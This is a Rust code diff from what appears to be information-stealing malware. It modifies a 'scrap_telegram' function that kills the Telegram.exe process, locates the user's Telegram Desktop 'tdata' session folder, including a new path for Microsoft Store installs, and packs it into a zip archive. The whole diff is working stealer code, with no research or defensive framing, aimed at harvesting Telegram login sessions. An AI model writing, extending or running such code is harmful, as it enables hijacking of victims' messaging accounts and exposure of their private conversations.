@@ -3,15 +3,22 @@ use utils::{get_process_directory, kill_proc_by_name};
 use walkdir::WalkDir;
 use zip::{write::FileOptions, ZipWriter};
 
-pub fn scrap_telegram(telegram_path: &PathBuf, telegram_zip_path: &PathBuf) -> Result<(), &'static str>{
+
+pub fn scrap_telegram(telegram_path: &PathBuf, telegram_zip_path: &PathBuf, local_path: &PathBuf) -> Result<(), &'static str>{
     let telegram_proc_name = String::from_str("Telegram.exe").unwrap();
-    let mut telegram_path = telegram_path.clone();
-    if !telegram_path.exists(){
-        match get_process_directory(&telegram_proc_name){
-            Ok(dir) => {telegram_path = dir;}
-            Err(_) => {return Err("Telegram directory does not exist");}
+    let telegram_path_buf: PathBuf;
+    match get_process_directory(&telegram_proc_name){
+        Ok(dir) => {telegram_path_buf = dir;}
+        Err(_) => {
+            if telegram_path.exists(){
+                telegram_path_buf = telegram_path.clone();
+            }
+            else{
+                return Err("Telegram directory does not exist");
+            }
         }
     }
+    let telegram_path = telegram_path_buf;
     kill_proc_by_name(&telegram_proc_name);
     let file: File; 
     match File::create(telegram_zip_path){
@@ -19,7 +26,16 @@ pub fn scrap_telegram(telegram_path: &PathBuf, telegram_zip_path: &PathBuf) -> R
         Err(_) => {return Err("Telegram zip creation error");}
     };
     let mut zip_file = ZipWriter::new(file);
-    let tdata_path = telegram_path.join("tdata");
+    let tdata_path: PathBuf;
+    if telegram_path.to_str().unwrap().contains("WindowsApps"){
+        let package_name: &str = telegram_path.file_name().unwrap().to_str().unwrap();
+        let name_vector: Vec<&str> = package_name.split("_").collect();
+        let package_name = name_vector[0].to_string() + "_" + name_vector[4];
+        tdata_path = local_path.join("Packages").join(package_name).join("LocalCache").join("Roaming").join("Telegram Desktop UWP").join("tdata");
+    }
+    else{
+        tdata_path = telegram_path.join("tdata");
+    }
     let tdata_path_len = tdata_path.to_str().unwrap().len();
     for entry in WalkDir::new(&tdata_path) {
         let entry = entry.unwrap();
